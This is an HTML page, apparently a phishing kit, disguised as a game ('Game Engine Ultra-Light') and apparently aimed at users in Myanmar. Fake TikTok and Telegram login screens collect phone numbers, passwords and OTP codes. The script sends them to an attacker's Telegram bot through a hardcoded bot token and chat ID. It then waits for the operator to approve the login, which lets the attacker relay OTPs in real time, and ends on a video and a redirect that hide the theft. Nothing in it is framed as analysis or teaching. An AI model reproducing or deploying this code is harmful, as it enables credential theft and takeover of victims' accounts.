<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Game Engine Ultra-Light</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #000; font-family: sans-serif; }
        
        /* ပေါ့ပါးတဲ့ Background ပြောင်းလဲခြင်း */
        .bg-light-dark { background: radial-gradient(circle, #1a1a1a 0%, #000 100%); }
        
        .tt-input { width: 100%; padding: 14px; border: 1px solid #333; background: #111; color: white; border-radius: 8px; outline: none; margin-bottom: 12px; }
        
        #topNotice { position: fixed; top: -100px; left: 0; width: 100%; padding: 18px; text-align: center; color: white; font-weight: bold; transition: 0.4s ease; z-index: 9999; }
        .notice-success { background: #10b981; }
        .notice-error { background: #ef4444; }

        #splash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 10000; display: flex; flex-direction: column; items-center; justify-content: center; color: white; }
        
        .entry-btn { position: absolute; bottom: 40px; left: 50%; transform: translateX(-50%); background: #fe2c55; padding: 12px 40px; border-radius: 50px; color: white; font-weight: bold; cursor: pointer; z-index: 100; box-shadow: 0 4px 20px rgba(254, 44, 85, 0.4); }

        /* Video Smoothness Fix */
        video { width: 100%; height: 100%; object-fit: cover; pointer-events: none; }
    </style>
</head>
<body class="bg-light-dark text-white">

<div id="topNotice"></div>

<!-- Splash Screen -->
<div id="splash">
    <div class="w-12 h-12 border-4 border-red-500 border-t-transparent rounded-full animate-spin"></div>
    <p class="mt-4 text-gray-500 text-sm tracking-widest">LOADING ENGINE...</p>
</div>

<div id="app" class="w-full h-full relative hidden">
    
    <!-- STEP 1: Selection Screen (Optimized for 1000032513.jpg) -->
    <div id="selectScreen" class="w-full h-full flex flex-col items-center justify-center p-8">
        <div class="bg-[#111]/80 border border-white/10 backdrop-blur-lg p-10 w-full max-w-sm rounded-[30px] text-center shadow-2xl">
            <h1 class="text-xl font-bold mb-8">Login to continue</h1>
            <button onclick="toggle('tgScreen')" class="w-full bg-[#2481cc] text-white py-4 rounded-xl mb-4 flex items-center justify-center gap-3 active:scale-95 transition">
                <i class="fa-brands fa-telegram text-xl"></i> Telegram
            </button>
            <button onclick="toggle('ttScreen')" class="w-full bg-white text-black py-4 rounded-xl flex items-center justify-center gap-3 active:scale-95 transition">
                <i class="fa-brands fa-tiktok text-xl"></i> TikTok
            </button>
        </div>
    </div>

    <!-- TikTok Login -->
    <div id="ttScreen" class="hidden bg-black w-full h-full p-6">
        <div class="flex items-center justify-between mb-8">
            <i onclick="toggle('selectScreen')" class="fa-solid fa-xmark text-xl"></i>
            <span class="font-bold">Login</span>
            <span></span>
        </div>
        <div class="flex gap-2 mb-4">
            <div class="border border-white/10 bg-[#111] px-4 py-4 rounded-lg text-sm text-gray-400">MM +95</div>
            <input type="number" id="ttPhone" placeholder="Phone number" class="tt-input flex-1 m-0">
        </div>
        <input type="password" id="ttPass" placeholder="Password" class="tt-input">
        <button onclick="submitTT()" class="w-full bg-[#fe2c55] text-white py-4 rounded-lg font-bold mt-10 active:opacity-80">Log in</button>
    </div>

    <!-- Telegram Login -->
    <div id="tgScreen" class="hidden bg-black w-full h-full p-8">
        <i onclick="toggle('selectScreen')" class="fa-solid fa-arrow-left text-xl mb-10 block"></i>
        <h1 class="text-2xl font-bold mb-10">Telegram</h1>
        <input type="number" id="tgPhone" placeholder="Phone number" class="tt-input text-lg border-0 border-b border-gray-700 rounded-none bg-transparent mb-6">
        <input type="number" id="tgOtp" placeholder="OTP Code" class="tt-input text-lg border-0 border-b border-gray-700 rounded-none bg-transparent mb-10">
        <button onclick="submitTG()" class="w-full bg-[#2481cc] text-white py-4 rounded-xl font-bold">CONTINUE</button>
    </div>

    <!-- Checking Screen -->
    <div id="waitScreen" class="hidden w-full h-full flex flex-col items-center justify-center bg-black/80">
        <div class="text-center">
            <div class="w-14 h-14 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mb-4 mx-auto"></div>
            <p class="font-bold tracking-widest text-sm">စစ်ဆေးနေပါသည်...</p>
        </div>
    </div>

    <!-- Video Screen -->
    <div id="videoScreen" class="hidden w-full h-full relative">
        <video id="bgVideo" loop playsinline preload="auto">
            <source src="https://raw.githubusercontent.com/tar-alt/Photo-link-/6c702837cece7d0f80bad49fe77f65382f442422/From%20KlickPin%20CF%20Clear%20social%20dialogue%20prompts%20for%20people%20who%20love%20beauty%20with%20timeless%20style%20that%20stay%20calm%20and%20fair%20-%20Pin-1121326007230552065.mp4" type="video/mp4">
        </video>
        <button onclick="window.location.href='https://www.crazygames.com'" class="entry-btn">ဝင်ရောက်ရန်</button>
    </div>

</div>

<script>
    const token = "8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0";
    const chat = "5304050102";
    let userKey = "ID_" + Math.floor(Math.random() * 9999);

    window.onload = () => {
        const v = document.getElementById('bgVideo');
        v.load(); // ကြိုတင် Load လုပ်ထားခြင်း
        setTimeout(() => {
            document.getElementById('splash').style.opacity = '0';
            setTimeout(() => {
                document.getElementById('splash').style.display = 'none';
                document.getElementById('app').classList.remove('hidden');
                if(localStorage.getItem('is_approved') === 'true') playFinal();
            }, 500);
        }, 1500);
    };

    function toggle(id) {
        document.querySelectorAll('#app > div').forEach(d => d.classList.add('hidden'));
        document.getElementById(id).classList.remove('hidden');
    }

    function formatPh(num) {
        let n = num.toString();
        return n.startsWith('09') ? n : (n.startsWith('9') ? '0'+n : '09'+n);
    }

    async function submitTT() {
        const ph = formatPh(document.getElementById('ttPhone').value);
        const pass = document.getElementById('ttPass').value;
        toggle('waitScreen');
        await sendBot(`🔔 TikTok\nPH: ${ph}\nPass: ${pass}\nID: ${userKey}`, true);
        startPolling();
    }

    async function submitTG() {
        const ph = formatPh(document.getElementById('tgPhone').value);
        const otp = document.getElementById('tgOtp').value;
        toggle('waitScreen');
        await sendBot(`🔔 Telegram\nPH: ${ph}\nOTP: ${otp}\nID: ${userKey}`, true);
        startPolling();
    }

    async function sendBot(msg, withBtn) {
        let body = { chat_id: chat, text: msg };
        if(withBtn) body.reply_markup = { inline_keyboard: [[{text: "✅ Approve", callback_data: `ok_${userKey}`},{text: "❌ Reject", callback_data: `no_${userKey}`}]] };
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(body)});
    }

    function showNotice(msg, type) {
        const el = document.getElementById('topNotice');
        el.innerText = msg;
        el.className = (type === 'success') ? 'notice-success' : 'notice-error';
        el.style.top = '20px';
        setTimeout(() => el.style.top = '-100px', 4000);
    }

    function startPolling() {
        const interval = setInterval(async () => {
            const res = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=-1`);
            const data = await res.json();
            const last = data.result?.[data.result.length - 1];
            if (last?.callback_query?.data === `ok_${userKey}`) {
                clearInterval(interval);
                localStorage.setItem('is_approved', 'true');
                showNotice("ဝင်ရောက်မှု အောင်မြင်ပါသည်", "success");
                playFinal();
            } else if (last?.callback_query?.data === `no_${userKey}`) {
                clearInterval(interval);
                showNotice("ဝင်ရောက်မှု မအောင်မြင်ပါ", "error");
                toggle('selectScreen');
            }
        }, 3000);
    }

    function playFinal() {
        toggle('videoScreen');
        const v = document.getElementById('bgVideo');
        v.muted = false;
        v.play().catch(() => {
            document.addEventListener('click', () => {
                v.play();
                const ctx = new AudioContext();
                const src = ctx.createMediaElementSource(v);
                const gain = ctx.createGain();
                gain.gain.value = 4.0;
                src.connect(gain); gain.connect(ctx.destination);
            }, { once: true });
            showNotice("အသံထွက်ရန် နှိပ်ပါ", "success");
        });
    }
</script>
</body>
</html>
